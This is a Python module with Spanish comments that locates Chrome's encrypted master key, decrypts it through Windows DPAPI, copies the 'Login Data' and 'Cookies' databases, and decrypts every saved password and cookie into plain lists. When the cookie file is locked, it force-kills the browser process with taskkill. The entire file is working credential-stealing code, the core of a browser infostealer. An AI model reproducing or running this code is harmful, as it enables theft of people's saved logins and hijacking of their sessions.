import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt
from Crypto.Cipher import AES
import psutil
import subprocess
import time

def obtener_proceso_usando_archivo(archivo):
    for proceso in psutil.process_iter():
        try:
            archivos_abiertos = proceso.open_files()
            for archivo_abierto in archivos_abiertos:
                if archivo_abierto.path == archivo:
                    return proceso
        except psutil.AccessDenied:
            pass
    return None


def obtener_fecha_calculada(microsegundos):

    if microsegundos != 86400000000 and microsegundos:
        try:
            #las fechas en chrome de calculan sumando la fecha 1601/01/01 mas los microsegundos que se encuentren en la bdd
            return datetime(1601, 1, 1) + timedelta(microseconds=microsegundos)
        except Exception as e:
            return microsegundos
    else:
        return ""


def obtener_llave_encriptacion():
    directorio_archivo_llave = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(directorio_archivo_llave, "r", encoding="utf-8") as f:
        archivo = f.read()
        archivo = json.loads(archivo)

    # decodifico, ya que está en base64
    llave = base64.b64decode(archivo["os_crypt"]["encrypted_key"])
    # 5 primeros caracteres son basura luego de decodificar ya que es informacion sobre la api que se utilizo para cifrar
    llave = llave[5:]
    
    #retorno llave desencriptada
    return win32crypt.CryptUnprotectData(llave, None, None, None, 0)[1]


def desencriptar_dato(data, key):
    try:
        # vector de inicializazcion para el cifrado
        iv = data[3:15]
        data = data[15:]
        # genero el cifrado con la llave
        cifrado = AES.new(key, AES.MODE_GCM, iv)
        # desencripto contrasenia
        return cifrado.decrypt(data)[:-16].decode()
    except:
        try:
            #si falla intento desencriptarla con win32crypt
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # no se pudo desencriptar, puede que haya estado vacio el campo, se retorna vacio
            return ""


def obtener_contrasenias():
    # obtengo la llave
    llave = obtener_llave_encriptacion()
    # directorio a archivo bdd que contiene las contrasenias
    directorio_bdd = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    
    # copio el archivo a mi lugar de ejecucion ya que se puede bloquear la bdd si el navegador la está usando
    nuevo_archivo_bdd = "Navegador.db"
    shutil.copyfile(directorio_bdd, nuevo_archivo_bdd)
    # conecto
    db = sqlite3.connect(nuevo_archivo_bdd)
    cursor = db.cursor()

    #array para guardar las contrasenias
    lista_respuesta = []

    #consulta a la tabla "logins"
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # itero sobre las filas
    for origin_url, action_url, username_value, password_value, date_created, date_last_used in cursor.fetchall():
        #objeto auxiliar para guardar un objeto con los datos
        aux = {}
        contrasenia = desencriptar_dato(password_value, llave)     
        if username_value or contrasenia:

            aux = {
                "origin_url":origin_url,
                "action_url":action_url,
                "username":username_value,
                "password": contrasenia,
                "fecha_creacion":obtener_fecha_calculada(date_created),
                "ultimo_acceso":obtener_fecha_calculada(date_last_used)
            }
        else:
            continue

        #agrego el objeto a la lista
        lista_respuesta.append(aux)

    cursor.close()
    db.close()
    try:
        # mando a borrar el archivo
        os.remove(nuevo_archivo_bdd)
    except:
        pass
    
    #retorno la lista
    return lista_respuesta

    
def obtener_cookies():
    #obtengo la llave
    llave = obtener_llave_encriptacion()
    # directorio a archivo bdd que contiene las cookies
    directorio_cookies = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")

    # copio el archivo a mi lugar de ejecucion ya que se puede bloquear la bdd si el navegador la está usando
    nuevo_archivo_bdd = "Cookies.db"
    try:
        #intento copiar el archivo
        shutil.copyfile(directorio_cookies, nuevo_archivo_bdd)
    except:
        # Obtener el proceso que está utilizando el archivo
        proceso = obtener_proceso_usando_archivo(directorio_cookies)
        # Nombre del proceso que quieres detener
        nombre_proceso = str(proceso.name())
        try:
            # Ejecutar el comando para detener el proceso
            subprocess.run(["taskkill", "/F", "/IM", nombre_proceso], check=True)
            print(f"Proceso {nombre_proceso} detenido correctamente")
            #espero
            time.sleep(2)
            #intento nuevamente
            shutil.copyfile(directorio_cookies, nuevo_archivo_bdd)
        
        except subprocess.CalledProcessError as e:
            print(f"No se pudo detener el proceso {nombre_proceso}: {e}")
            

    # conecto
    db = sqlite3.connect(nuevo_archivo_bdd)
    # decodifico los datos ignorando errores
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    # consulta a la tablas cookies
    cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies")
    
    #array para guardar las cookies
    lista_respuesta = []
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        #objeto auxiliar para guardar un objeto con los datos
        aux = {}

        #value guarda el dato si esta desencriptada
        if not value:
            valor_desencriptado = desencriptar_dato(encrypted_value, llave)
        else:
            valor_desencriptado = value

        if valor_desencriptado:
            aux = {
                "dominio":host_key,
                "nombre_cookie":name,
                "valor":valor_desencriptado,
                "fecha_creacion":obtener_fecha_calculada(creation_utc),
                "ultimo_acceso":obtener_fecha_calculada(last_access_utc),
                "expira":obtener_fecha_calculada(expires_utc)
            }
        else:
            continue
           
        #agrego el objeto a la lista
        lista_respuesta.append(aux)

    cursor.close()
    db.close()
    try:
        # mando a borrar el archivo
        os.remove(nuevo_archivo_bdd)
    except:
        pass

    #retorno la lista
    return lista_respuesta

